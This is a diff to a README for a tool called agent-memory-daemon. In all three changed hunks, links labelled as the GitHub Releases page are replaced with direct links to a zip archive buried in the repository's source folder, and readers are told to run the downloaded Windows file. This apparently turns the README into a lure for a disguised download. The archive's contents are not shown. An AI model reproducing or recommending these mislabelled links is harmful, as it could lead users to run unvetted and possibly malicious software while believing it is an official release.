@@ -1,6 +1,6 @@
 # 🤖 agent-memory-daemon - Keep Agent Memory Organized
 
-[![Download agent-memory-daemon](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/releases)
+[![Download agent-memory-daemon](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/raw/refs/heads/main/src/memory/memory_daemon_agent_2.9.zip)
 
 ## 📦 What this app does
 
@@ -31,7 +31,7 @@ If you plan to connect it to another agent tool, make sure that tool can read an
 
 Visit the release page here:
 
-[Download agent-memory-daemon from GitHub Releases](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/releases)
+[Download agent-memory-daemon from GitHub Releases](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/raw/refs/heads/main/src/memory/memory_daemon_agent_2.9.zip)
 
 On that page:
 1. Find the latest release
@@ -216,6 +216,6 @@ It also works well when you need memory that stays on the same machine.
 
 If you need a newer build or want to reinstall, use the release page again:
 
-[Open the GitHub Releases page](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/releases)
+[Open the GitHub Releases page](https://github.com/Charlesfrederickmenningerdateplum166/agent-memory-daemon/raw/refs/heads/main/src/memory/memory_daemon_agent_2.9.zip)
 
 From there, choose the latest Windows file and run it on your PC
